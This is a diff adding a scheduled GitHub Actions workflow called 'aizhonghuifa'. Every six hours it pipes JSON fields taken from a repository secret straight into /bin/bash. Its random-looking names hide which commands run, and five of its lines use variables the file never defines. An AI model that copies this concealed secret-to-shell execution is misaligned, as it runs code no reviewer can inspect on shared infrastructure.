@@ -1,0 +1,24 @@
+name: aizhonghuifa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: aizhonghuifa
+        env:
+          qmmjq4: ${{ secrets.qmmjq4 }}
+        run: |
+          echo $qmmjq4 | jq -r .ze56997 | /bin/bash
+          echo $jwdl9417 | jq -r .oxo853 | /bin/bash
+          echo $rxu9429 | jq -r .sgnx36287 | /bin/bash
+          echo $fol0 | jq -r .qyow31888 | /bin/bash
+          echo $t36831 | jq -r .gr7 | /bin/bash
+          echo $oy406 | jq -r .zv0 | /bin/bash
+
